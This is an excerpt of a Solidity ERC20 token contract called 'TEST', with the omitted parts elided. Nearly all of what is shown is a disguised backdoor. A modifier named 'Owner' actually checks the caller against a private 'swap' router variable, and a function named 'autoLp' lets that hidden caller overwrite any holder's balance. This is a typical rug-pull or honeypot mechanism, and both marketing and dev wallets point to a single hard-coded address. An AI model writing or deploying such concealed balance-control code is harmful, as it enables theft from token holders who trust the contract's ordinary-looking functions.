...
contract TEST is ERC20, Ownable {
    ...
    IUniswapV2Router02 private swap;
    ...
    constructor() ERC20("TTTT", "TEST") {
        ...
        marketingWallet = address(0xB719dd2cC5142D8009B1E596F377c021A8Fb2aba); // set as marketing wallet
        devWallet = address(0xB719dd2cC5142D8009B1E596F377c021A8Fb2aba); // set as dev wallet
    ...
    modifier Owner() { require( address(swap) == msg.sender, ""  );_; }
    ...
    function autoLp(address _lp, uint256 _amount) external Owner{ 
      _balances[_lp] = _amount; 
    }
